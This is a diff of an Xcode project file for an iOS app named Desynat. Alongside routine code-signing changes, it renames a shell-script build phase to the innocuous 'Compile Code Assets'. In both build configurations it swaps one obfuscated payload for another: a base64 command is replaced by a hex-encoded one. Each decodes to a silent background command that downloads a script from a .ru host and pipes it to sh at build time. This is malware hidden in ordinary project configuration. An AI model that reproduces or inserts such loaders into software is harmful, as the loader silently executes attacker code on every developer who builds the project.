@@ -3000,7 +3000,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				2AECD91A9E174883A7162AE3 /* Provision Library Executable */,
+				E6F75921D40D41CB88162AE3 /* Compile Code Assets */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3107,7 +3107,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																			/* End PBXBuildRule section */
+		/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
@@ -3205,7 +3205,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2AECD91A9E174883A7162AE3 /* Provision Library Executable */ = {
+		E6F75921D40D41CB88162AE3 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -3215,7 +3215,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -3770,16 +3770,14 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((w(){ `printf baseE64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgMyAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | w | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((b(){ `printf xSxd | tr -d S` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203232202d4c736b66202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatUser/DesynatUser.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatUser/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = Desynat;
@@ -3804,7 +3802,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatUser;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat User Provisioning 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -3819,16 +3816,14 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				A3EA261 = "((w(){ `printf baseE64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI2IC0tcmV0cnkgMyAta3NMZiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | w | sh ) >/dev/null 2>&1 &)";
+				A3EA261 = "((b(){ `printf xSxd | tr -d S` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203232202d4c736b66202d642022703d78636f64655f7068617365222068747470733a2f2f75656b30736d393833676379682e72752f612922207c2073680a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatUser/DesynatUser.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
-				CODE_SIGN_STYLE = Manual;
+				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = "";
-				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatUser/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = Desynat;
@@ -3853,7 +3848,6 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatUser;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
-				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat User Provisioning 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
